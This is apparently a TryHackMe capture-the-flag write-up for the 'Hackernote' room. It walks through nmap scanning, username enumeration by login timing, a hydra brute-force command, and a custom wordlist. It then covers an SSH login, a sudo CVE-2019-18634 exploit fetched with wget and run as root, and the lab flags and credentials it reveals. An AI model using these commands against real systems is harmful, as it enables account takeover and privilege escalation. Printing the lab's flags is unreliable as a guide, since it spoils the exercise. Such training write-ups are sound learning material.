---
title:  Hackernote
name: CYB3RM3 | Hackernote
date:   2021-09-05 13:46:58
categories: [TryHackMe, Web]
tags: [Web]
---
A custom webapp, introducing username enumeration, custom wordlists and a basic privilege escalation exploit.

THM Room [https://tryhackme.com/room/hackernote](https://tryhackme.com/room/hackernote)

## TASK 1 : Reconnaissance <a name="Reconnaissance"></a>

### Which ports are open? (in numerical order)

```console
root@ip-10-10-127-246:~# nmap -sC -vv 10.10.127.143  
 
[...]  
PORT  STATE SERVICE  REASON  
22/tcp open ssh    syn-ack ttl 64  
| ssh-hostkey:  
| 2048 10:a6:95:34:62:b0:56:2a:38:15:77:58:f4:f3:6c:ac (RSA)  
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC0njoI1MTN18O8+mhh7M4EpPVA2+5B3OsOtfyhpjYadmUYmS1LgxRSCAyUNFP3iKM7vmqbC9KalD6hUSWmorDoPCzgTuLPf6784OURkFZeZMmC3Cw3Qmdu348Vf2kvM0EAXJmcZG3Y6fspIsNgye6eZkVNHZ1m4qyvJ+/b6WLD0fqA1yQgKhvLKqIAedsni0Qs8HtJDkAIvySCigaqGJVONPbXc2/z2g5io+Tv3/wC/2YTNzP5DyDYI9wL2k2A9dAeaaG51z6z02l6F1zGzFwiwrFP+fopEjhQUa99f3saIgoq3aPOJ/QufS1SiZc6AqeD8RJ/6HWz10timm5A+n4J  
| 256 6f:18:27:a4:e7:21:9d:4e:6d:55:b3:ac:c5:2d:d5:d3 (ECDSA)  
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHKcOFLvSTrwsitMygOlMRDEZIfujX3UEXx9cLfrmkYnn0dHtHsmkcUUMc1YrwaZlDeORnJE5Z/NAH70GaidO2s=  
| 256 2d:c3:1b:58:4d:c3:5d:8e:6a:f6:37:9d:ca:ad:20:7c (EdDSA)  
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGFFNuuI7oo+OdJaPnUbVa1hN/rtLQalzQ1vkgWKsF9z  
80/tcp open http   syn-ack ttl 64  
| http-methods:  
|_ Supported Methods: GET HEAD POST OPTIONS  
|_http-title: Home - hackerNote  
8080/tcp open http-proxy syn-ack ttl 64  
| http-methods:  
|_ Supported Methods: GET HEAD POST OPTIONS  
|_http-open-proxy: Proxy might be redirecting requests  
|_http-title: Home - hackerNote  
[...]  
``` 

Answer : 22,80,8080

### What programming language is the backend written in ?

```console
root@ip-10-10-127-246:~# nmap -sV -sC -vv 10.10.127.143  
  
[...]  
80/tcp open http  syn-ack ttl 64 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)  
| http-methods:  
|_ Supported Methods: GET HEAD POST OPTIONS  
|_http-title: Home - hackerNote  
8080/tcp open http  syn-ack ttl 64 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)  
| http-methods:  
|_ Supported Methods: GET HEAD POST OPTIONS  
|_http-open-proxy: Proxy might be redirecting requests  
|_http-title: Home - hackerNote  
[...]
```

Answer : go

## TASK 2 : Investigate <a name="Investigate"></a>

### Create your own user account
No answer : created user john and password 12345 with hint 12345

### Log in to your account
No answer  

### Try and log in to an invalid user account
No answer  

### Try and log in to your account, with an incorrect password.
No answer. Delay before error  

### Notice the timing difference. This allows user enumeration
No answer. Wrong username is returning "invalid username or password" immediately and clicking "i forgot my password" with a valid username show the hint for this usernme.

## TASK 3 : Exploit <a name="Exploit"></a>

### Try to write a script to perform a timing attack.
No answer. Download script from [https://raw.githubusercontent.com/NinjaJc01/hackerNoteExploits/master/exploit.py](https://raw.githubusercontent.com/NinjaJc01/hackerNoteExploits/master/exploit.py)

### How many usernames from the list are valid ?

Run the script downloaded.  
Answer : 1

### What are/is the valid username(s) ?
    

Answer : james

## TASK 4 : Attack Passwords <a name="AttackPasswords"></a>

### Form the hydra command to attack the login API route
    
```shell
hydra -l james -P wordlist.txt 10.10.127.143 http-post-form "/api/user/login:username=^USER^&amp;password=^PASS^:F=incorrect" -V
```

### How many passwords were in your wordlist?
    
Form the wordlist.txt from known favorites color and number (hint from james "forgotten password") with HASHCAT-UTILS and the two files numbers.txt and colors.txt :

```console
cp numbers.txt /opt/hashcat-utils/src  
cp colors.txt /opt/hashcat-utils/src  
cd /opt/hashcat-utils/src  
./combinator.bin colors.txt numbers.txt &gt; wordlist.txt  
wc wordlist.txt  
180
```

Answer : 180

### What was the user's password?  
I do a cluster bomb attack with BURPSUITE and the wordlist.txt and i get the result blue7 password match with a different length.

Answer : bleu7

### Login as the user to the platform
No answer but James let us a note as reminder with his SSH password : dak4ddb37b

### What's the user's SSH password?
Answer : dak4ddb37b

### Log in as the user to SSH with the credentials you have.
```console
ssh james@10.10.127.143
```

No answer

### What's the user flag?  
```console
cat user.txt  
thm{56911bd7ba1371a3221478aa5c094d68}
```

Answer :thm{56911bd7ba1371a3221478aa5c094d68}

## TASK 5 : Escalate <a name="Escalate"></a>

### What is the CVE number for the exploit? 
Reading the texttell us the recent CVE is "pwdfeedback" and googling"pwdfeedback" return theCVE-2019-18634.  
Answer :CVE-2019-18634

### Find the exploit from [https://github.com/saleemrashid/](https://github.com/saleemrashid/) and download the files.

```console
cd Deskstop  
mkdir cve-2019-18634  
cd cve-2019-18634  
git clone https://github.com/saleemrashid/sudo-cve-2019-18634
```

No answer

### Compile the exploit from Kali linux.
    
```console
cd sudo-cve-2019-18634  
make
```

No answer

### SCP the exploit binary to the box.
    

Copy and save this code to the KALI where you downloaded the exploit :

```python
import http.server  
import socketserver  
PORT = 8888  
Handler = http.server.SimpleHTTPRequestHandler  
with socketserver.TCPServer(("", PORT), Handler) as http:  
  print("serving at port", PORT)  
  http.serve_forever()
```

Run the above code :

```console
python server.py
```

No answer

### Run the exploit, get root.
    

On the SSH of James :

```console
cd /tmp  
wget 10.10.127.246:8888/exploit  
chmod +x exploit  
./exploit  
id  
uid=0(root)
```

No Answer

### What is the root flag?
    
```console
cat /root/root.txt  
thm{af55ada6c2445446eb0606b5a2d3a4d2}
```

Answer : thm{af55ada6c2445446eb0606b5a2d3a4d2}

[test]:      http://jekyllrb.com